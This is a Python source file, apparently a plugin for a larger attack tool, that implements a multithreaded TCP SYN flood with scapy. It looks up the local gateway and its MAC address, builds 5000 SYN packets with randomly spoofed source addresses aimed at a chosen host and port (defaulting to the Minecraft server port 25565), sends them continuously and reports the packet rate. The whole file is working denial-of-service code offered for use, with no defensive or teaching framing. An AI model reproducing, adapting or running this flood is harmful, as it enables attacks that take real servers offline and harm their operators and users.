from plugins.common import *
from scapy.all import IP, TCP, sendp, sendpfast, RandShort, RandIP, conf, Ether
import threading
import time
import subprocess

conf.verb = 0

def get_gateway():
    result = subprocess.run('route print 0.0.0.0', shell=True, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[0] == '0.0.0.0':
            return parts[2]
    return None

def tcpflood(server, threads):
    try:
        if ':' in server:
            host, port = server.split(':')
        else:
            host = server
            port = 25565

        port = int(port)
        threads = int(threads)
        count = [0]
        stop = threading.Event()

        gw = get_gateway()
        if not gw:
            logging.error('Cannot find gateway')
            return
        logging.info(f'Gateway: {gw}')

        iface = '\\Device\\NPF_{083600BE-B1CF-4E2C-B93E-CA2F1FB3725A}'
        conf.iface = iface

        result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
        gw_mac = None
        for line in result.stdout.splitlines():
            if gw in line:
                parts = line.split()
                for p in parts:
                    if '-' in p and len(p) == 17:
                        gw_mac = p.replace('-', ':')
                        break

        if not gw_mac:
            subprocess.run(f'ping {gw} -n 1', shell=True, capture_output=True)
            result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if gw in line:
                    parts = line.split()
                    for p in parts:
                        if '-' in p and len(p) == 17:
                            gw_mac = p.replace('-', ':')
                            break

        if not gw_mac:
            logging.error('Cannot find gateway MAC')
            return

        logging.info(f'Gateway MAC: {gw_mac}')
        logging.info('Building SYN packet pool...')

        pkts = []
        for _ in range(5000):
            pkt = (
                Ether(dst=gw_mac) /
                IP(src=RandIP(), dst=host) /
                TCP(sport=RandShort(), dport=port, flags='S', seq=RandShort(), window=65535)
            )
            pkts.append(pkt)

        logging.info(f'Starting SYN flood -> {host}:{port} | {threads} threads | Ctrl+C to stop')

        def worker():
            i = 0
            while not stop.is_set():
                try:
                    sendp(pkts[i % 5000], iface=iface, verbose=False, realtime=False)
                    count[0] += 1
                    i += 1
                except:
                    pass

        # stats thread แยกต่างหาก
        def stats():
            prev = 0
            while not stop.is_set():
                time.sleep(1)
                diff = count[0] - prev
                prev = count[0]
                mbps = (diff * 60 * 8) / 1_000_000
                logging.info(f'SYN sent: {count[0]} | {diff} pps | ~{mbps:.2f} Mbps')

        pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        pool.append(threading.Thread(target=stats, daemon=True))
        for t in pool:
            t.start()

        # main thread รอ ctrl+c
        while not stop.is_set():
            time.sleep(0.1)

    except KeyboardInterrupt:
        stop.set()
        logging.success(f'Stopped | Total SYN sent: {count[0]}')
    except Exception as e:
        logging.error(e)